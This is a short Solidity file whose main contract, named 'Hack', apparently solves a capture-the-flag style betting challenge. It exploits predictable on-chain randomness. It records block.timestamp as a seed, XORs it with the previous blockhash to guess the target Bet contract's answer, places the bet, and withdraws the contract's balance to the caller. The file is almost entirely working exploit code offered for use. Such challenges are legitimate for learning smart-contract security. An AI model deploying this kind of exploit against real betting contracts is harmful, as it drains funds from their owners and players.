pragma solidity >=0.7.0;

contract BetFactory {
    function create () public payable {}
    function validate (uint token) public {}
}

contract Bet {
    function bet (uint guess) public payable {}
}

contract Hack {
    uint public seed;

    function create (address _factory) public payable {
        BetFactory factory = BetFactory(_factory);
        seed = block.timestamp;
        factory.create{value: msg.value}();
    }

    function validate (address _factory, uint token) public payable {
        BetFactory factory = BetFactory(_factory);
        factory.validate(token);
    }

    function bet (address target, uint seed) public payable{
        Bet instance = Bet(target);
        instance.bet{value: msg.value}(seed ^ uint(blockhash(block.number - 1)));
    }

    receive () external payable {}

    function withdraw () public {
        msg.sender.call{value: address(this).balance}("");
    }
}